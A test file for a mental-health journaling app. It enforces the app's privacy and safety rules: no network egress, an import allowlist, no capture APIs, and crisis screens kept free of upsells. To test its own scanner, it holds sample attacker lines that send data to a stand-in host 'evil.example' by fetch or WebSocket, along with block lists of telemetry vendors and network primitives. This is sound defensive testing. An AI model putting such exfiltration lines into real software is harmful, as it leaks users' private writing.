import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
/* Imported rather than grepped. lib/entitlement.ts is pure and loads under bare Node — which
   is the reason it was refactored — so the free-route rules can be EXECUTED here instead of
   pattern-matched against the text of their own declaration. Two tests below used to assert
   that the source contained `'/grounding'`, which a commented-out `isGated` satisfies. */
import { ALWAYS_FREE_ROUTES, isGated } from '../lib/entitlement.ts';

/* The SAFETY.md constraints, as a test.
 *
 * SAFETY.md documents them and explains why; this file makes them fail a build. A rule
 * that lives only in a markdown file is a rule that gets removed by someone who never
 * opened it. */

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
/* `hooks` was missing from this list, and it was the worst possible directory to miss.
   Nothing in this file scanned it — not the capture test, not the tracker test, not the
   appearance-metric test — while hooks/useEntitlement.ts is the file both docs/API.md and
   its own header designate as the place the RevenueCat SDK gets installed. That SDK opens
   a TLS connection on configure() and ships the vendor identifier. The suite would have
   stayed green through it. */
const DIRS = ['app', 'components', 'lib', 'store', 'content', 'types', 'constants', 'hooks'];

function sourceFiles() {
  const out = [];
  const walk = (dir) => {
    let entries;
    try {
      entries = readdirSync(dir);
    } catch {
      return;
    }
    for (const e of entries) {
      const full = join(dir, e);
      if (statSync(full).isDirectory()) walk(full);
      else if (/\.(ts|tsx)$/.test(e)) out.push(full);
    }
  };
  for (const d of DIRS) walk(join(ROOT, d));
  return out;
}

/** Source with comments removed, so prose cannot be mistaken for code.
 *
 * Not hypothetical tidying. Three separate assertions in this file have failed on English:
 * a comment reading `tell "fresh install" from "we could not ask"` was read as importing a
 * package called "we could not ask", and two comments explaining WHY there is no WebView
 * were read as embedding one. A test that fails on its own explanation is a test people
 * learn to route around, and the routing-around is what actually costs you.
 *
 * THE REGEX VERSION OF THIS WAS A BYPASS, AND IT DISARMED ALL FOUR EGRESS GUARDS AT ONCE.
 *
 * `src.replace(/\/\*[\s\S]*?\*\//g, ' ')` does not know what a string literal is, so any code
 * sitting between a string containing a slash-star and a string containing a star-slash was
 * blanked before a single assertion ran. Three lines — open the window with a string, put a
 * fetch in the middle, close it with a string — and the network-primitive check, the URL
 * centralisation check, the WebView check and the third-party import allowlist all pass.
 * `@sentry/react-native` imported inside such a window passed too. The one promise this app
 * makes about itself was guarded by a regex that a two-line string literal turns off.
 *
 * So this is a scanner rather than a regex. It walks the source once, tracking whether it is
 * inside a single-quoted, double-quoted or template string, and only blanks a region it
 * reached from actual code. A slash-star inside a string is now just text. Comments are still
 * removed, so the three prose false-positives above stay fixed — there is a test below that
 * holds both halves: the bypass is caught, and the prose still passes. */
function withoutComments(src) {
  let out = '';
  let i = 0;
  const n = src.length;
  /* null = in code; otherwise the quote character we are waiting to close. */
  let quote = null;

  while (i < n) {
    const ch = src[i];
    const next = src[i + 1];

    if (quote) {
      /* Inside a string. Nothing here opens a comment. Copied through, so a specifier or a
         URL written in real code is still seen by the assertions. */
      if (ch === '\\') { out += src.slice(i, i + 2); i += 2; continue; }
      if (ch === quote) quote = null;
      /* An unterminated quote would swallow the rest of the file, which is the same failure
         in a different costume. A newline ends anything but a template string. */
      else if (ch === '\n' && quote !== '`') quote = null;
      out += ch; i += 1; continue;
    }

    if (ch === '/' && next === '*') {
      const end = src.indexOf('*/', i + 2);
      const skipped = end === -1 ? src.slice(i) : src.slice(i, end + 2);
      /* Newlines kept, so line numbers in failure messages stay honest. */
      out += ' ' + skipped.replace(/[^\n]/g, '');
      i = end === -1 ? n : end + 2;
      continue;
    }
    /* Not `://` — a line comment, not the middle of a URL. */
    if (ch === '/' && next === '/' && src[i - 1] !== ':') {
      const end = src.indexOf('\n', i);
      i = end === -1 ? n : end;
      continue;
    }
    if (ch === '\'' || ch === '"' || ch === '`') quote = ch;
    out += ch; i += 1;
  }
  return out;
}

const FILES = sourceFiles().map((f) => ({ path: f.replace(ROOT + '/', ''), src: readFileSync(f, 'utf8') }));

describe('the comment stripper the egress guards depend on', () => {
  /* Every network assertion in this file runs on withoutComments() output, so a hole here is
     a hole in all of them at once. These are tests OF THE GUARD, not of the app — the thing
     that was missing when a regex stood here. */

  /* Assembled at runtime so this file does not contain the literal sequence and trip its own
     assertions, and so the test reads as what it is: an attacker's three lines. */
  const OPEN = '/' + '*';
  const CLOSE = '*' + '/';

  test('code hidden between two string literals is still seen', () => {
    const attack = [
      `const glyph = '${OPEN}';`,
      "export async function ping(){ return fetch('https://evil.example/j?d=' + body); }",
      `const close = '${CLOSE}';`,
    ].join('\n');
    const out = withoutComments(attack);
    assert.match(out, /\bfetch\s*\(/, 'a fetch() between two string literals was blanked');
    assert.match(out, /https?:\/\//, 'a URL between two string literals was blanked');
  });

  test('an import hidden the same way is still seen', () => {
    const attack = [
      `const a = "${OPEN}";`,
      "import * as Sentry from '@sentry/react-native';",
      `const b = "${CLOSE}";`,
    ].join('\n');
    assert.match(withoutComments(attack), /@sentry\/react-native/,
      'a third-party import between two string literals was blanked');
  });

  test('a template literal cannot open the window either', () => {
    const attack = [
      'const a = `' + OPEN + '`;',
      "const send = () => new WebSocket('wss://evil.example');",
      'const b = `' + CLOSE + '`;',
    ].join('\n');
    assert.match(withoutComments(attack), /\bWebSocket\b/,
      'a WebSocket between two template literals was blanked');
  });

  test('and the prose it exists for is still removed', () => {
    /* The other half, and the reason this cannot simply scan raw source. These three are the
       real false positives named in the header — each one failed a real assertion. */
    const prose = [
      `${OPEN} tell "fresh install" from "we could not ask" ${CLOSE}`,
      `${OPEN} there is deliberately no WebView anywhere in this app ${CLOSE}`,
      '// and no react-native-webview either',
      'const real = 1;',
    ].join('\n');
    const out = withoutComments(prose);
    assert.doesNotMatch(out, /we could not ask/, 'prose in a block comment survived');
    assert.doesNotMatch(out, /\bWebView\b/, 'a comment explaining the WebView rule survived');
    assert.doesNotMatch(out, /react-native-webview/, 'a line comment survived');
    assert.match(out, /const real = 1;/, 'the stripper ate real code around the comments');
  });

  test('a URL in real code survives, and so do line numbers', () => {
    const src = ["const a = 1;", `${OPEN}\n a comment\n spanning lines\n${CLOSE}`,
                 "const u = 'https://example.com/x';", '// trailing'].join('\n');
    const out = withoutComments(src);
    assert.match(out, /https:\/\/example\.com\/x/, 'a URL in real code was removed');
    assert.equal(out.split('\n').length, src.split('\n').length,
      'the stripper changed the line count, so failure messages will point at the wrong line');
  });

  test('an unterminated string does not swallow the rest of the file', () => {
    const src = ["const bad = 'oops;", "export function ping(){ return fetch('https://evil.example'); }"].join('\n');
    assert.match(withoutComments(src), /\bfetch\s*\(/,
      'an unterminated quote blanked everything after it — the same hole in a different costume');
  });
});

describe('the source tree is what SAFETY.md says it is', () => {
  test('there are source files to check', () => {
    assert.ok(FILES.length > 20, `only found ${FILES.length} source files`);
  });

  // SAFETY.md §1
  test('no capture API — still OR moving — appears anywhere', () => {
    /* `recordAsync` was the hole in this list. CameraView.recordAsync() writes video into
       the app cache, which is a more serious breach of "the camera is a live mirror and
       nothing is recorded" than any of the still-capture calls the regex did cover, and it
       would have sailed straight through the test written to prevent exactly this.

       The module specifiers are listed alongside the CamelCase identifiers because
       `import { saveToLibraryAsync } from 'expo-media-library'` matches neither
       `MediaLibrary` nor `ImagePicker` — the hyphenated package name is how the dependency
       actually arrives. */
    const forbidden =
      /takePicture|takePhoto|savePhoto|captureRef|toDataURL|MediaLibrary|getScreenshot|ImagePicker|recordAsync|startRecording|expo-media-library|expo-image-picker|expo-screen-capture|getUserMedia\s*\([^)]*audio\s*:\s*true/i;
    for (const f of FILES) {
      assert.doesNotMatch(f.src, forbidden, `capture API referenced in ${f.path}`);
    }
  });

  test('the disclaimer gate cannot lock somebody out of crisis support', () => {
    /* After a failed load the state is emptyState(), so `disclaimerAcceptedAt` is null even
       for a long-time user. Without an exemption, tapping the always-mounted Support pill
       changes the pathname, re-fires the redirect, and replaces them back into onboarding —
       crisis support unreachable, permanently, because acceptDisclaimer cannot persist while
       writes are locked. The person it traps is the one whose journal just became
       unreadable. */
    const layout = FILES.find((f) => f.path === 'app/_layout.tsx');
    assert.match(layout.src, /CRISIS_ROUTES/, 'the disclaimer redirect has no crisis carve-out');
    for (const route of ['/support', '/grounding']) {
      assert.match(
        layout.src,
        new RegExp(`CRISIS_ROUTES[^;]*'${route}'`, 's'),
        `${route} is not exempt from the disclaimer redirect`
      );
    }
  });

  test('a render-time crash still leaves a way to crisis support and to the export', () => {
    /* There was no error boundary at all, so one TypeError unmounted the tree — SupportBar
       included — and left a blank screen with no numbers, no breathing, and no route to the
       only copy of a year of private writing. */
    const layout = FILES.find((f) => f.path === 'app/_layout.tsx');
    assert.match(layout.src, /ErrorBoundary/, 'the root layout exports no ErrorBoundary');
    const crash = FILES.find((f) => f.path === 'components/CrashScreen.tsx');
    assert.ok(crash, 'components/CrashScreen.tsx is missing');
    assert.match(crash.src, /tel:/, 'the crash screen offers no way to call anybody');
    assert.match(crash.src, /exportJson/, 'the crash screen offers no way to save the writing');
  });

  // SAFETY.md §2
  test('no appearance or body metric fields exist', () => {
    // Matches identifier-ish usage, not prose in a comment explaining the ban.
    const forbidden = /\b(bmi|bodyFat|waistSize|attractivenessScore|hotnessScore|appearanceScore|lookScore|percentileRank)\b/i;
    for (const f of FILES) {
      assert.doesNotMatch(f.src, forbidden, `appearance metric in ${f.path}`);
    }
  });

  test('no weight, calorie or measurement field on any type', () => {
    /* "ANY TYPE" MEANT ONE FILE. This read only types/index.ts, while more than twenty files
       under lib/ and content/ declare exported interfaces — so
       `export interface BodyLog { weight: number; calories: number }` in lib/measure.ts
       passed the whole suite, breaching SAFETY.md §2 in silence. Verified by doing it.
       The indent filter was the second half of the problem: `^\s{2}` matches exactly two
       spaces, so any nested declaration was invisible. Field lines are now taken at any
       depth, from every file. */
    /* SCANS TYPE BODIES, NOT LINES. The first repair here matched `^\s+name:` — a field on
       its own line — which meant a ONE-LINE declaration slipped straight past it:
       `export interface BodyLog { weight: number; calories: number; photoUri: string; }`
       appended to lib/measure.ts was not caught. That is the same "the fixture cannot tell
       the bug from the fix" shape this whole pass exists to remove, committed while removing
       it. Brace-matching each interface and type-alias body catches any formatting.
       Deliberately NOT every `name:` in the file: `WEIGHT` in content/groundwork.ts is how
       much an action weighs against a day's capacity, and `weight: '700'` in the type scale
       is a font weight. Both are object literals rather than type declarations, so scoping to
       type bodies excludes them without needing an exemption for either. */
    const TYPE_HEAD = /\b(?:interface\s+\w+[^{;]*|type\s+\w+\s*=\s*)\{/g;
    const typeBodies = (src) => {
      const out = [];
      for (const m of src.matchAll(TYPE_HEAD)) {
        let depth = 0;
        for (let j = m.index + m[0].length - 1; j < src.length; j += 1) {
          if (src[j] === '{') depth += 1;
          else if (src[j] === '}') {
            depth -= 1;
            if (depth === 0) { out.push(src.slice(m.index + m[0].length, j)); break; }
          }
        }
      }
      return out;
    };
    const FIELD = /(?<![\w.$])([A-Za-z_$][\w$]*)\s*\??\s*:/g;
    /* WHOLE WORDS, NOT SUBSTRINGS. The first version matched `uri` anywhere and flagged
       `during: BREATHE.during` in app/still.tsx — d-uri-ng. A guard that fires on innocent
       identifiers gets deleted by whoever it fires on, so the field name is split on
       camelCase and each part checked for membership. `photoUri` still fails; `during` does
       not. */
    const BANNED = new Set([
      'weight', 'calorie', 'calories', 'bmi', 'measurement', 'measurements',
      'photo', 'photos', 'image', 'images', 'uri', 'thumbnail', 'selfie',
    ]);
    const parts = (name) => name.replace(/([a-z0-9])([A-Z])/g, '$1 $2').toLowerCase().split(/[\s_]+/);

    /* Style properties that collide with a banned word and mean something else entirely.
       Enumerated across the whole tree rather than guessed: `fontWeight` is the only one, in
       two files. Kept as an explicit set so that adding to it is a visible decision — the
       banned word here is BODY weight, and the day somebody wants to exempt `bodyWeight`
       this list is where the argument has to happen. */
    const STYLE_PROPS = new Set(['fontWeight']);

    for (const f of FILES) {
      /* Comments stripped first: several files legitimately EXPLAIN in prose that there is no
         weight field, and a guard that fails on its own justification is one people route
         around — the lesson the comment stripper at the top of this file was written for. */
      for (const body of typeBodies(withoutComments(f.src))) {
        for (const m of body.matchAll(FIELD)) {
          if (STYLE_PROPS.has(m[1])) continue;
          const hit = parts(m[1]).find((w) => BANNED.has(w));
          assert.ok(!hit,
            `${f.path} declares a field named "${m[1]}", which contains "${hit}". SAFETY.md `
            + `§2: no field for weight, measurements, calories, photographs or an image URI `
            + `exists anywhere in this app.`);
        }
      }
    }
  });

  /* The layering rule the whole test strategy rests on. Every suite here imports
     `../lib/*.ts` straight into a .mjs file under bare Node — no jest, no transform — and
     that only works while lib/ has no React and no store in its import graph.
     `lib/entitlement.ts` used to export a React hook and import zustand, which is exactly
     why it was the only engine module with no test file. */
  test('lib/ imports neither React nor the store', () => {
    for (const f of FILES) {
      if (!f.path.startsWith('lib/')) continue;
      assert.doesNotMatch(f.src, /from ['"]react['"]|from ['"]react-native['"]/,
        `${f.path} imports React — lib/ must stay runnable in bare Node`);
      assert.doesNotMatch(f.src, /from ['"]\.\.\/store\//,
        `${f.path} imports the store — lib/ is the layer the store is built on, not the reverse`);
    }
  });

  /* ---------- SAFETY.md §6: nothing leaves the phone ----------
   *
   * This is the promise the product is built on and the one whose breach would hurt people
   * most, and until now it was guarded by two tests that could both be walked past without
   * trying.
   *
   * The first checked ONE file — lib/storage.ts — so a fetch() in any screen, in the store,
   * or in a component passed. The second was a blocklist of six vendor names, defeated four
   * separate ways: `await import('@sentry/react-native')` never matches because the regex
   * requires the literal `from '`, and dynamic import is already the house style in
   * components/MirrorSurface.tsx, so a contributor copying the local idiom bypasses it by
   * accident; '@react-native-firebase/analytics' does not match because after the optional
   * `@` the alternation has to hit at position zero; and Bugsnag, Datadog, LogRocket,
   * AppsFlyer, Branch, react-native-device-info, expo-updates, expo-notifications and
   * react-native-purchases were simply never on the list.
   *
   * Both are replaced with an ALLOWLIST. A blocklist asks "did we think of this vendor?" and
   * fails silently on every answer of no. An allowlist asks "is this one of the twelve
   * packages this app is known to use?", which is a question with a correct answer that does
   * not decay. Adding a dependency now requires editing this file, next to this comment. */

  /** Every third-party module the source tree is permitted to import. */
  const ALLOWED_PACKAGES = new Set([
    /* The cipher behind encryption at rest. Chosen partly BECAUSE of this list: audited,
       zero runtime dependencies, no native code, no install script, and small enough that
       reading it is a realistic afternoon rather than an act of faith. It does no I/O of any
       kind — it takes bytes and returns bytes. */
    '@noble/ciphers',
    '@react-native-async-storage/async-storage',
    'expo-blur',
    'expo-camera',
    /* Key custody and the CSPRNG for encryption at rest. expo-secure-store is the iOS
       Keychain; the key is stored WHEN_UNLOCKED_THIS_DEVICE_ONLY specifically so it does NOT
       sync to iCloud Keychain, because a synced key is a key on Apple's servers and that
       would break the promise on screen one. expo-crypto is used only for getRandomBytes. */
    'expo-crypto',
    'expo-secure-store',
    /* The native review prompt. iOS caps it at three a year per user, which is why the
       moment that triggers it fires once, after something has gone well, and never during a
       bad stretch. No network access of its own — it asks the OS to show a system sheet. */
    'expo-store-review',
    /* expo-file-system is the one package on this list that CAN reach the network:
       `downloadAsync` and `uploadAsync` are part of its surface. Anneal uses it for exactly
       one thing — writing the export to the cache directory so the iOS share sheet offers
       "Save to Files" instead of leading with Messages — and the test below asserts the
       networking half is never touched. Admitted deliberately, with a guard, rather than
       waved through. */
    'expo-file-system',
    'expo-haptics',
    'expo-linear-gradient',
    'expo-router',
    'expo-status-bar',
    'react',
    'react-native',
    'react-native-safe-area-context',
    'react-native-svg',
    'zustand',
  ]);

  /** `from 'x'`, `import('x')` and `require('x')` alike. The second and third are the ones
   *  the old regex could not see.
   *
   *  THE `\s+` AFTER `from` IS LOAD-BEARING AND USED TO BE `\s*`.
   *  With `\s*`, any ordinary sentence ENDING IN THE WORD "from" matched, because the closing
   *  quote of the string sat directly against it. A screen containing
   *
   *      <H1>{'Where you are starting from'}</H1>
   *
   *  was reported as importing a package called "}<" — the capture ran from that quote to the
   *  next one several lines later. A false positive in a security guard is not harmless: this
   *  one is unfixable by the person who trips it except by rewording unrelated copy, which
   *  teaches everyone that the egress guards cry wolf.
   *
   *  Requiring whitespace would leave `from'react'` — valid JS that nobody writes — unseen,
   *  so the test below closes that hole explicitly rather than leaving it to a comment. */
  const SPECIFIERS = /(?:\bfrom\s+|\bimport\s*\(\s*|\brequire\s*\(\s*)['"`]([^'"`]+)['"`]/g;

  /** An import whose specifier is jammed against the keyword: `from'react'`. Legal, never
   *  written by hand, unformattable by prettier, and therefore the exact shape somebody
   *  would reach for to slip a package past the matcher above.
   *
   *  The quoted text must look like a MODULE SPECIFIER — the first draft of this guard was
   *  just `/\bfrom['"]/` and reproduced, in a new test, the identical false positive it had
   *  been written to fix: it fired on `'Where you are starting from'` too. What separates an
   *  import from a sentence is not the spacing, it is what comes after the quote. */
  const JAMMED_IMPORT = /\bfrom['"`][@\w][\w@.\-/]*['"`]/;

  /** '@scope/pkg/deep/path' -> '@scope/pkg';  'pkg/deep/path' -> 'pkg'. */
  const packageOf = (spec) => {
    const parts = spec.split('/');
    return spec.startsWith('@') ? parts.slice(0, 2).join('/') : parts[0];
  };

  /** The one file allowed to contain a URL.
   *
   *  Centralising them is what makes them auditable: every address this app can send
   *  somebody to is in one short file that a person can read in a minute, rather than
   *  scattered across screens where a new one arrives unnoticed. The two assertions below
   *  are a pair — one says no other file may hold a URL, the other says this file may hold
   *  nothing but URLs. Neither is useful alone. */
  const URL_HOME = 'constants/links.ts';

  test('nothing in the source tree can open a network connection', () => {
    /* Covers the primitives rather than the vendors, across the whole tree. */
    const primitives = /\bfetch\s*\(|XMLHttpRequest|\bWebSocket\b|EventSource|sendBeacon|\baxios\b/;
    const urls = /https?:\/\//;
    for (const f of FILES) {
      const code = withoutComments(f.src);
      assert.doesNotMatch(code, primitives, `${f.path} contains a network primitive`);
      if (f.path === URL_HOME) continue;
      assert.doesNotMatch(code, urls,
        `${f.path} contains a URL — every address the app can open belongs in ${URL_HOME}, ` +
          `so that the full list stays readable in one place`);
    }
  });

  test('the URL file holds addresses and nothing else', () => {
    /* The other half. A file exempted from the URL rule must not become the place where a
       fetch quietly lands, and the addresses in it must be ones the SYSTEM BROWSER opens —
       a WebView would make the age-rating answer to "Unrestricted Web Access" a Yes. */
    const links = FILES.find((f) => f.path === URL_HOME);
    assert.ok(links, `${URL_HOME} is missing`);
    assert.doesNotMatch(withoutComments(links.src), /\bfetch\s*\(|XMLHttpRequest|WebSocket|WebView|sendBeacon/,
      `${URL_HOME} is exempt from the URL rule and must not fetch anything`);
    const urls = [...withoutComments(links.src).matchAll(/https?:\/\/[^\s'"`]+/g)].map((m) => m[0]);
    assert.ok(urls.length > 0, `${URL_HOME} contains no URLs, which cannot be right`);
    for (const url of urls) {
      assert.match(url, /^https:/, `${url} is not https`);
    }
  });

  test('URLs are opened in the browser, never in an embedded WebView', () => {
    for (const f of FILES) {
      assert.doesNotMatch(withoutComments(f.src), /\bWebView\b|react-native-webview/,
        `${f.path} embeds a browser — this raises the age rating and is never needed here`);
    }
  });

  test('every third-party import is on the allowlist', () => {
    for (const f of FILES) {
      for (const [, spec] of withoutComments(f.src).matchAll(SPECIFIERS)) {
        if (spec.startsWith('.') || spec.startsWith('/')) continue; // local module
        const pkg = packageOf(spec);
        assert.ok(
          ALLOWED_PACKAGES.has(pkg),
          `${f.path} imports "${pkg}", which is not on the allowlist in this file. If it is ` +
            `genuinely needed, add it here and say in the commit message what it does with ` +
            `the network.`
        );
      }
    }
  });

  test('no import hides its package against the keyword', () => {
    /* The other half of the `\s+` above. Nobody writes `from'react'`, and prettier would
       undo it — so if it appears, the interesting question is why, and the allowlist above
       cannot see it. Fail rather than let a package through unexamined. */
    for (const f of FILES) {
      assert.doesNotMatch(withoutComments(f.src), JAMMED_IMPORT,
        `${f.path} has an import specifier jammed against "from", which the allowlist cannot `
        + `read. Put a space after the keyword.`);
    }
  });

  test('the manifest declares no dependency that can phone home', () => {
    /* The allowlist above governs what the source imports. This governs what is installed,
       because adding the package is step one and a test that only reads source would go
       green for a whole commit before the import lands. */
    const pkg = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8'));
    const banned =
      /sentry|bugsnag|datadog|logrocket|amplitude|mixpanel|segment|posthog|firebase|appsflyer|branch|analytics|expo-updates|expo-notifications|expo-tracking-transparency|device-info|ngrok/i;
    for (const name of Object.keys(pkg.dependencies ?? {})) {
      assert.doesNotMatch(name, banned, `${name} is a shipped dependency that reaches the network`);
    }
    /* Every shipped dependency is either imported by the source or a platform requirement
       named here. An unimported package is still compiled into the binary.
       `expo-constants` and `expo-linking` are imported by nothing in this app; they stay
       declared because expo-router requires them and Expo's version policy expects them
       pinned in the manifest. Worth knowing that expo-constants is the module exposing
       device and session identifiers — it is one line from being misused, which is why it is
       named here rather than left to look like an app dependency. */
    const PLATFORM_ONLY = new Set([
      '@expo/metro-runtime', 'expo', 'expo-constants', 'expo-linking',
      'react-dom', 'react-native-screens', 'react-native-web',
    ]);
    for (const name of Object.keys(pkg.dependencies ?? {})) {
      assert.ok(
        ALLOWED_PACKAGES.has(name) || PLATFORM_ONLY.has(name),
        `${name} is installed but imported nowhere — remove it or justify it in PLATFORM_ONLY`
      );
    }
  });

  test('the journal is sealed on disk, and the user is told when it is not', () => {
    /* lib/storage.ts falls back to plaintext when the keychain is unreachable, which is the
       right call — refusing to write would mean a keychain hiccup silently stops somebody
       recording anything on a bad day. But a silent downgrade of a promise made on screen
       one is a different thing from a considered fallback, and the code comment claiming it
       is "surfaced to the user rather than hidden" was, for a while, simply not true. */
    const storage = FILES.find((f) => f.path === 'lib/storage.ts');
    assert.match(storage.src, /\bseal\(/, 'saveState does not encrypt');
    assert.match(storage.src, /isEncryptionActive/, 'the encryption state is not readable');

    const notice = FILES.find((f) => f.path === 'components/StorageNotice.tsx');
    assert.match(notice.src, /notEncrypted/,
      'nothing tells the user when their writing is being stored unsealed');

    const copy = FILES.find((f) => f.path === 'content/copy.ts');
    assert.match(copy.src, /notEncrypted:/, 'the disclosure has no copy');
  });

  test('the key never leaves the device and never syncs to iCloud', () => {
    /* WHEN_UNLOCKED_THIS_DEVICE_ONLY is the whole point. Without THIS_DEVICE_ONLY the key
       goes into iCloud Keychain, which puts it on Apple's servers — and "nothing leaves this
       phone" would then be false about the one secret that protects everything else. */
    const key = FILES.find((f) => f.path === 'hooks/deviceKey.ts');
    assert.ok(key, 'hooks/deviceKey.ts is missing');
    assert.match(key.src, /WHEN_UNLOCKED_THIS_DEVICE_ONLY/,
      'the device key is not pinned to this device');
    assert.doesNotMatch(key.src, /AFTER_FIRST_UNLOCK(?!_THIS_DEVICE_ONLY)/,
      'a weaker keychain accessibility class is in use');
  });

  test('there is a way to reach a human that is not the review page', () => {
    /* Without one, a person who hits a bug, loses writing, or wants to say the mirror
       exercise made things worse has exactly one channel: the public App Store review page.
       Slow, one-directional, and it costs a rating for something that might have been fixed
       the same day. It sits LAST on the support screen — below every crisis line — because
       it is about the software and must not compete with a phone number. */
    const support = FILES.find((f) => f.path === 'app/support.tsx');
    assert.match(support.src, /SUPPORT_MAILTO/, 'no in-app route to a human');
    assert.match(support.src, /not a crisis line/i,
      'the support address does not distinguish itself from the crisis lines above it');

    const links = FILES.find((f) => f.path === 'constants/links.ts');
    assert.doesNotMatch(withoutComments(links.src), /getState\(\)|thoughtRecords|useStore|entitlement/,
      'the feedback draft must not attach app state — the user sends only what they write');
  });

  test('no prompt is a dead control', () => {
    /* The review button read "Write a review ›" and its handler did nothing but return, so
       tapping it convinced the person the app was broken at the exact moment they felt well
       enough about it to say so publicly. */
    const card = FILES.find((f) => f.path === 'components/MomentCard.tsx');
    assert.match(card.src, /StoreReview\.requestReview/, 'the review prompt does nothing');
    assert.match(card.src, /isAvailableAsync/, 'the review prompt is not guarded');
  });

  test('the file-system module is used for files, never for transfers', () => {
    /* The allowlist above is name-based and cannot tell which half of a package is in use.
       expo-file-system ships `downloadAsync` and `uploadAsync`, which are a straightforward
       route out of the device for the export file — the one artefact in this app that
       contains everything somebody has written. */
    const forbidden = /downloadAsync|uploadAsync|createDownloadResumable|FileSystemNetwork/;
    for (const f of FILES) {
      assert.doesNotMatch(f.src, forbidden, `${f.path} uses a file-system transfer API`);
    }
  });

  test('the app config opens no remote channel', () => {
    const cfg = JSON.parse(readFileSync(join(ROOT, 'app.json'), 'utf8'));
    const expo = cfg.expo ?? cfg;
    /* expo-updates is remote code delivery: it fetches a manifest on launch and can replace
       the JS bundle in an installed app. Nothing about it is compatible with "there is no
       code in here that could send anything anywhere". */
    assert.equal(expo.updates, undefined, 'app.json configures expo-updates (remote code delivery)');
    const ats = expo.ios?.infoPlist?.NSAppTransportSecurity;
    assert.equal(ats, undefined, 'app.json weakens App Transport Security');
  });

  // SAFETY.md §4
  test('the always-free route list still contains every safety surface', () => {
    const ent = FILES.find((f) => f.path === 'lib/entitlement.ts');
    for (const route of ['/grounding', '/support', '/checkin', '/']) {
      assert.match(ent.src, new RegExp(`'${route}'`), `${route} missing from ALWAYS_FREE_ROUTES`);
    }
  });

  test('the persistent Support button is still mounted in the root layout', () => {
    const layout = FILES.find((f) => f.path === 'app/_layout.tsx');
    assert.match(layout.src, /SupportBar/);
    assert.match(layout.src, /router\.push\('\/support'\)/);
  });

  // SAFETY.md §9 and §10
  test('mirror practice is still locked before the unlock week', () => {
    const protocol = FILES.find((f) => f.path === 'lib/protocol.ts');
    assert.match(protocol.src, /if \(week < MIRROR_UNLOCK_WEEK\) return null/);
  });

  test('week unlocking still takes no date parameter', () => {
    const protocol = FILES.find((f) => f.path === 'lib/protocol.ts');
    const sig = protocol.src.match(/export function isWeekUnlocked\(([^)]*)\)/)[1];
    assert.doesNotMatch(sig, /date|now|Date/i, `isWeekUnlocked gained a time input: ${sig}`);
  });

  // SAFETY.md §11
  test('completing an experiment cannot rewrite the prediction', () => {
    const store = FILES.find((f) => f.path === 'store/useStore.ts');
    /* ⚠ THIS READ THE INTERFACE, NOT THE IMPLEMENTATION, AND SO ASSERTED NOTHING.
       `completeExperiment:` first occurs in the interface at the top of store/useStore.ts, and
       `markModuleRead` a few lines later — also in the interface. The slice was four lines of
       type signature; the real function, three hundred lines down, was never read. Verified by
       rewriting `prediction` inside it: the whole suite stayed green while hindsight bias
       overwrote the frozen prediction, which is the one thing SAFETY.md §11 exists to stop.
       Anchored on the implementation's own signature, which only the definition has. */
    const at = store.src.indexOf('completeExperiment: (expId, outcome) => {');
    assert.notEqual(at, -1,
      'completeExperiment is no longer implemented under that signature, so this guard is '
      + 'reading nothing again — re-anchor it on the definition');
    const fn = store.src.slice(at);
    /* Bounded by the end of the arrow function rather than by the next member's name, so a
       reordering of the store cannot silently widen or empty the window. */
    const end = fn.indexOf('\n  },');
    const body = end === -1 ? fn : fn.slice(0, end);
    assert.doesNotMatch(body, /prediction|likelihoodBefore|avoiding/,
      'completeExperiment touches a pre-event field');
  });
});

/* ---------- monetisation ----------
 *
 * The commercial rules from .claude/skills/value-first-growth, made executable. Growth
 * pressure is real and it arrives later, quietly, in a pull request that looks reasonable.
 * These are the lines that should cost somebody a failing build to cross. */

describe('the money never touches the safety surfaces', () => {
  /* Screens somebody reaches while distressed. No upsell, no upgrade link, no Anneal+
     mention, in any state, including after a completed exercise. */
  /* components/Finish.tsx is on this list because the completion screens for grounding and
     urge surfing now live inside it. Without it, those two screens keep passing this grep
     while rendering an upsell through a shared component — the guarantee would still be
     written down and would quietly stop being tested. */
  /* components/CrashScreen.tsx belongs here for the same reason as the rest: it renders
     when somebody's app has just broken and their only copy of a year of private writing is
     on the far side of a button. That is the least acceptable moment in the entire product
     to mention a subscription. */
  /* DERIVED, NOT LISTED — this was five hand-written paths and it had drifted past three of
     the screens it exists to protect. `app/checkin.tsx` is named in SAFETY.md §4;
     `app/still.tsx` is promised BY NAME to every person who finishes the survey; and
     `app/measure.tsx` is the clinical baseline. All three could have grown a paywall with the
     suite green, which was verified by doing it.
     Every always-free route's screen is sacred by construction now, plus the two components
     that render at somebody's worst moment. A route added to ALWAYS_FREE_ROUTES is covered
     the day it lands rather than the day somebody remembers this list. */
  const ROUTE_FILES = {
    '/checkin': 'app/checkin.tsx',
    '/grounding': 'app/grounding.tsx',
    '/support': 'app/support.tsx',
    '/still': 'app/still.tsx',
    '/measure': 'app/measure.tsx',
  };
  /* FREE IS NOT THE SAME AS SACRED, and deriving this list is what forced the distinction to
     be written down. Sacred means "reached at somebody's worst, so it must never sell".
     Three free routes deliberately sell and are exempt by name rather than by omission:
       · /paywall     — it is the purchase screen.
       · /onboarding  — screen one states the commercial shape on purpose, because a customer
                        who knows the deal from the start converts better and refunds less.
       · /            — Today is where the app's ONE commercial interruption is designed to
                        land (the `week-one-ask` moment, after a real number has moved). It is
                        free forever and it is not a crisis surface. */
  const SELLS_BY_DESIGN = new Set(['/paywall', '/onboarding', '/']);

  test('every always-free route has a screen this list knows about', () => {
    /* Without this, adding a route and forgetting to map it would quietly shrink the guard —
       which is exactly how the previous hand-written version decayed. */
    const unmapped = ALWAYS_FREE_ROUTES
      .filter((r) => !SELLS_BY_DESIGN.has(r) && !(r in ROUTE_FILES));
    assert.deepEqual(unmapped, [],
      `these free routes have no screen mapped, so nothing checks them for an upgrade `
      + `surface: ${unmapped.join(', ')}`);
  });

  const SACRED = [
    ...Object.values(ROUTE_FILES),
    /* Not routes, but rendered at the worst moments there are. */
    'app/urges.tsx', 'components/Finish.tsx', 'components/CrashScreen.tsx',
  ];

  for (const path of SACRED) {
    test(`${path} contains no upgrade surface`, () => {
      const f = FILES.find((x) => x.path === path);
      assert.ok(f, `${path} is missing`);
      assert.doesNotMatch(f.src, /\/paywall|Anneal\+|useEntitlement|PRICING/,
        `${path} is a screen people reach at their worst — it must never sell anything`);
    });
  }

